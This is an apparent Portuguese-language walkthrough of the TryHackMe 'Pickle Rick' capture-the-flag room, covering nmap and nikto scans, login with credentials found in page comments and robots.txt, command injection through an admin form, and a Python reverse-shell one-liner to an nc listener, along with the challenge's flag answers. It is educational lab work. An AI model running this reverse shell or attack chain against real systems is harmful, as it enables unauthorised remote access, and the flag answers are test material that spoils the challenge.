
# CTF Pickle Rick - Passo a passo do meu primeiro CTF do TryHackme
Este é um repositório focado no aprendizado e prática do conteúdo de ethical web hacking, e portanto, serão descritos os passos detalhadamente com explicações dos processos e comando minimamente diferentes para poder reforçar o aprendizado. 


## Descrição do desafio:
Preciso encontrar três "ingredientes" para poder ajudar o Rick a voltar a ser humano. 
* Qual é o primeiro ingrediente que Rick precisa?
* Qual é o segundo ingrediente que Rick precisa?
* Qual é o terceiro ingrediente que Rick precisa?

## Passos para resolução:
### Validação e verificação do HTML:
Primeira coisa efetuada, enquanto aguardava o scan com nmap executar, fiz uma verificação no html da página inicial.
Encontrada um detalhe comentado, o username necessário para acessar o servidor. 
![Print da tela da página alvo com o DevTools aberto mostrando selecionado um comentário com o username necessário.](image-1.png)

```
    Note to self, remember username!

    Username: R1ckRul3s
```
Checado também o comum `/robots.txt`, entretanto, só encontrado a palava:
`Wubbalubbadubdub`


### Scan de portas com Nmap:
Após a conclusão do scan com **nmap**, foi possível perceber que o servidor possuí as portas 22 e 80 abertas:
```
# Nmap 7.94SVN scan initiated Sun Jan  7 17:45:00 2024 as: nmap -sC -sV -oN nmap/initial 10.10.134.39
Nmap scan report for 10.10.134.39
Host is up (0.23s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4f:a2:95:54:fe:74:d4:e1:dc:48:38:c8:c9:52:46:60 (RSA)
|   256 9e:22:a1:0b:c7:3f:d2:92:45:6f:0b:c0:52:57:50:19 (ECDSA)
|_  256 7d:3a:88:0d:0d:2b:bf:d1:5a:71:d0:1a:78:b1:33:d3 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan  7 17:45:19 2024 -- 1 IP address (1 host up) scanned in 18.90 seconds
```
Foi utilizado o comando `nmap -sC -sV -oN nmap/initial 10.10.134.39` para fazer a varredura e salvar dentro da pasta nmap no arquivo initial o retorno do mesmo. 

**Detalhamento do comando usado no Nmap:**
* **nmap**: Comando utilizado para chamar a ferramente no terminal.
* **-sC**: Opção que permite scripts serem executados na varredura. Existe uma coleção de scripts mais detalhados, mas deixando em branco foi utilizado script default.
* **-sV**: Opção que ativa a detecção de versão dos serviços, tentando detalhar a versão dos softwares e serviços que estão sendo executados no alvo. 
* **-oN nmap/initial**: Esta opção tem como objetivos salvar o retorno da varredura em um arquivo legível salvo no diretório apontado.
* **10.10.134.39**: Este é o IP do alvo, sendo este utilizado para poder ser feita a varredura. 

A partir de agora será utilizado a variável IP para poder se referir ao IP do alvo. 

### Scan de Vulnerabilidades com Nikto:
No retorno do Nitko através do comando ` nikto -h http://$IP | tee nkto.log` (sendo $IP a variável apontada no terminal com o valor do IP), obtivemos:
* **/: The anti-clickjacking X-Frame-Options header is not present.**: É o cabeçalho usado para previnir ataques de clickjacking.
* **/: The X-Content-Type-Options header is not set.**: É usado para bloquear a detecção de tipos MIME pelos navegadores, que pode transformar tipos MIME não executáveis em tipos MIME executáveis.
* **Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.54).**: Indicando que a versão do apache usada não está atualizada, e portanto pode conter vulnerabilidades.
* **/login.php: Cookie PHPSESSID created without the httponly flag.**: Indica que o valor do cookie está desprotegido, possivelmente vulneravel a algum atacante executar algum script para capturar o valor do cookie. 
* **/icons/README: Apache default file found.**: Indica que um arquivo padrão do Apache foi localizado, e isso implica em uma possível identificação das configurações do mesmo. 
* **/login.php: Admin login page/section found.**: Isso indica que uma página ou seção de login de administrador foi encontrada. Isso pode ser um ponto de entrada para ataques se a página não estiver devidamente protegida.

**Detalhamento do comando usado no Nitko:**
* **nikto**: Comando utilizado para chamar a ferramente no terminal.
* **-h http://$IP**: A opção `-h` é utilizada para especificar o host que será escaneado. Sendo o host representado pela variável `IP` que havia sido declarada anteriormente no terminal através do comando `export IP=10.10.134.39`.
* **|**: O Pipe serve para pegar o retorno do comando a esquerda dele e usar como entrada para o comando a direita dele.
* **tee nkto.log**: Utilizando o comando tee é possível gravar a saída do comando em um arquivo chamado nkto.log e ainda exibí-la no terminal. 



### Primeira Flag conquistada:
Ao perceber que havia um endpoint `/login.php`, acessado o mesmo e feita a tentativa de acessar utilizando o username recuperado do comentário na página inicial (`R1ckRul3s`) e utilizada como senha a palavra encontrado em `/robots.txt` (`Wubbalubbadubdub`). 

![Pagina de login do site alvo com o username e senha preenchidos.](image-4.png)

Com sucesso consegui acessar a pagina de admin e a partir disso, foi possível encontrar o primeiro ingrediente (a primeira flag).

![Página acessada com o login e senha do Rick com o comando "ls" rodado em um campo de forms e vários arquivos encontrados na pasta raiz sendo expostos.](image-3.png)

A primeira flag se encontrava no arquivo de nome "Sup3rS3cretPickl3Ingred.txt" (ora ora, que coincidência), que ao mudar a url para ele, foi possível descobir a flag:

![Uma tela em branco com a primeira falg, sendo ela: "mr. meeseek hair"](image-5.png)

Encontrada a primeira flag, voltei para o HTML, para procurar outras informações, e me deparo com ourtro comentário no HTML logo abaixo do Input. 
```
<!-- 
 Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0== 
 -->
```
Joguei este hash em um decoder de base64 e ele me retornou outro hash, repeti o processo novamente e novamente outro hash. Repeti o processo então até que ele me retornasse algo diferente de um hash. E aí ele me retornou o seguinte:
`rabbit hole`.

**Caí em um atrativo para perder tempo.** 

<hr>

Segui as tentativas e decidi olhar todo o código fonte da página `/portal.php`, e no input de execução de comandos executei o comando `grep -R .` para pegar tudo possível dentro e retornar no output. Retornou muito do que eu já havia visto, mas optei por avaliar o código fonte inteiro. Onde foi possível identificar o que era "negado" das entrada do output. Sendo assim, comecei a cogitar a tentativa de um reverse shell com python, pois o mesmo era passível de ser executado. Utilizei o reverse shell do https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet.
**O comando usado foi:**
```python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.12.11",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'```
Ante de executar o código, deixei o ncat em "listen" através do comando `nc -lnvp 9999` na porta 9999 que foi a setada no código acima. Quando executei o código no site, foi possível diretamente acessar o servidor de forma remota através do shell.
Após acessar o servidor, naveguei pelos diretórios e encontrei o arquivo `second ingredients`, localizado em `/home/rick`.
O sgundo ingrediente era:
`1 jerry tear`

<hr>

Após conseguir acesso ao servidor, tentei acesso root e percebi que não havia nenhuma senha na máquina, portanto, tive acesso total a mesma, de forma que pude acessar o diretório raiz do sistema, encontrando assim a terceira flag, que estava nomeda como `3rd.txt`. E o terceiro ingrediente era:
`fleeb juice`


**Detalhamento do comando usado no Ncat:**
* **nc**: Comando utilizado para chamar a ferramenta do terminal e executá-la. 
* **-l**: Opção usada para especificar para o ncat que ele deve ficar "escutando" uma conexão de entrada.
* **-n**: Opção usada para impedir que o ncat realize qualquer pesquisa DNS ou portas, nomes de hosts...
* **-v**: Opção utilizada para aumentar a verbosidade do retorno do ncat, informando mais dados na saída do terminal. 
* **-p 9999**: A opção `-p` é usada para especificar a porta que o ncat deve ficar escutando, e o `9999` é a porta em questão.

**Detalhamento do código em Python utilizado:**
* **python3 -c**: Executa o código Python que segue na linha de comando.
* **import socket,subprocess,os**: importa os módulos necessários. O socket para conexões de rede, subprocess para criar novos processos e os para interfaces diversas do sistema operacional.
* **s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);**:Isso cria um novo objeto de socket que usa a família de endereços IPv4 (AF_INET) e o tipo de socket TCP (SOCK_STREAM).
* **s.connect(("10.6.12.11",9999));**: Isso conecta o socket ao endereço IP 10.6.12.11 na porta 9999.
* **os.dup2(s.fileno(),0), os.dup2(s.fileno(),1), os.dup2(s.fileno(),2);**: Essas linhas redirecionam os descritores de arquivo padrão para o socket. 0, 1 e 2 representam os descritores de arquivo padrão para entrada padrão, saída padrão e erro padrão, respectivamente. Isso significa que a entrada, saída e erro do processo que será criado serão enviados através do socket.
* **p=subprocess.call(["/bin/sh","-i"]);**: Isso cria um novo processo que inicia uma nova shell. A opção `-i` garante que a shell seja interativa, o que significa que ela pode receber entrada do usuário.
